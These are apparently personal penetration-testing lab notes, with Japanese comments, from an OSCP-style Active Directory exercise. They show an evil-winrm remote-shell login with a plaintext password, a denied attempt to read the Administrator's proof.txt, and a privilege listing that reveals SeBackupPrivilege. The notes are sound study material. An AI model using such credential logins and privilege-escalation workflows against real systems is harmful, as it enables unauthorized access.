```powershell
┌──(koshi㉿kali)-[~/Exam/AD/AD_Common]
└─$ evil-winrm -i 172.16.104.200 -u 'c.rogers' -p 'SnoozeRinseRevolve231'

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\c.rogers\Documents> whoami
oscp\c.rogers
*Evil-WinRM* PS C:\Users\c.rogers\Documents> cd ../
*Evil-WinRM* PS C:\Users\c.rogers> dir

```
![[Pasted image 20260223100654.png]]


- AdminのがAccess denied だけど
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
Access to the path 'C:\Users\Administrator\Desktop\proof.txt' is denied.
At line:1 char:1
+ type proof.txt
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\proof.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd /
dir
*Evil-WinRM* PS C:\> dir

```

- ファイルも転送できない

---

- backup権限が有効
```sh
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

